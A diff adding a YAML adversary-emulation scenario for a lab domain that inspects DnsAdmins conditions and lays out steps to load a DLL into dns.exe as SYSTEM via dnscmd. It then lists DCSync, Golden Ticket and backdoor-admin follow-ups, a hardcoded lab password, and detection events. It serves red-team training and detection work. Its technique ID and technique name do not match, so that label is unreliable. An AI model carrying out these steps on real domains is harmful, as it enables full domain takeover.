@@ -1,0 +1,94 @@
+- name: 'Scenario 3 - Pipeline Breach: DNSAdmins Group Abuse for SYSTEM Execution on Domain Controller (DC)'
+  description: >-
+    Models a domain-controller escalation path based on misuse of delegated DNS
+    administration rights rather than direct exploitation of the operating system.
+    With access to the svc_itops security context, the operator targets the DNS
+    service configuration on DC to register an attacker-controlled plugin DLL and
+    force execution inside dns.exe, which runs as SYSTEM. This reflects a
+    well-established abuse pattern in Windows enterprise environments where
+    administrative group membership can be weaponised for code execution on critical
+    infrastructure. Defenders should focus on DNS service configuration changes,
+    dnscmd or registry-based manipulation, service restart activity, and unexpected
+    module loads into the DNS process.
+  tactic: privilege-escalation
+  technique_id: T1574.011
+  technique_name: 'Domain Policy Modification: Group Policy Modification'
+  singleton: false
+  repeatable: false
+  delete_payload: false
+  executors:
+  - name: psh
+    platform: windows
+    command: |-
+      $ErrorActionPreference = "SilentlyContinue"
+      Import-Module ActiveDirectory -ErrorAction SilentlyContinue
+
+      Write-Host "[*] Inspecting DNSAdmin pivot conditions on DC" -ForegroundColor Cyan
+
+      Write-Host "`n[*] DNS service state" -ForegroundColor Yellow
+      Get-Service DNS -ErrorAction SilentlyContinue |
+        Select-Object Name, Status, StartType |
+        Format-Table -AutoSize | Out-String | Write-Host
+
+      Write-Host "`n[*] Current ServerLevelPluginDll value" -ForegroundColor Yellow
+      Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters" -Name ServerLevelPluginDll -ErrorAction SilentlyContinue |
+        Select-Object ServerLevelPluginDll | Format-List | Out-String | Write-Host
+
+      Write-Host "`n[*] svc_itops group membership" -ForegroundColor Yellow
+      Get-ADPrincipalGroupMembership "svc_itops" -ErrorAction SilentlyContinue |
+        Select-Object Name |
+        Sort-Object Name |
+        Format-Table -AutoSize | Out-String | Write-Host
+
+      Write-Host "`n[*] DNS resolution sanity check" -ForegroundColor Yellow
+      Resolve-DnsName -Name "cyberange.local" -ErrorAction SilentlyContinue |
+        Select-Object Name, Type, IPAddress |
+        Format-Table -AutoSize | Out-String | Write-Host
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 300
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info:
+      target_host: DC.cyberange.local
+      target_ip_suffix: .10
+      domain: cyberange.local
+      attacking_account:
+        username: svc_itops
+        password: 'ITops#Adm1n2025!'
+        groups:
+          - Domain Admins
+          - DnsAdmins
+      dnsadmin_abuse:
+        method: dnscmd /config /serverlevelplugindll
+        target_service: DNS Server (dns.exe)
+        service_runs_as: SYSTEM
+        dll_load_trigger: DNS service restart
+        registry_key: 'HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDll'
+      attack_steps:
+        step1: 'Authenticate as svc_itops to DC (DA + DnsAdmins rights)'
+        step2: 'Set plugin DLL path: dnscmd DC /config /serverlevelplugindll <UNC or local path>'
+        step3: 'Restart DNS service: sc \\DC stop dns && sc \\DC start dns'
+        step4: DLL executes as SYSTEM inside dns.exe on the DC
+        step5: Establish persistence or dump ntds.dit / perform DCSync
+      post_exploitation_options:
+        - DCSync all domain hashes
+        - Dump ntds.dit via Volume Shadow Copy
+        - Create Golden Ticket (krbtgt hash)
+        - Add backdoor Domain Admin account
+      cleanup_required:
+        - Remove ServerLevelPluginDll registry value before next DNS restart
+        - Otherwise DNS service will fail to start if DLL path is unreachable
+      detection_events:
+        - '4688 on DC - dnscmd.exe with /serverlevelplugindll argument'
+        - 'DNS Event 770 - DNS Server plugin DLL loaded'
+        - '7036 - DNS Server service stopped/started'
+        - 'Sysmon Event 7 - Unexpected DLL loaded by dns.exe'
+        - '4624 on DC - SYSTEM logon following DLL execution'
+        - '4662 on DC - Replication-Get-Changes-All if DCSync follows'
+  requirements: []
+  id: c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0
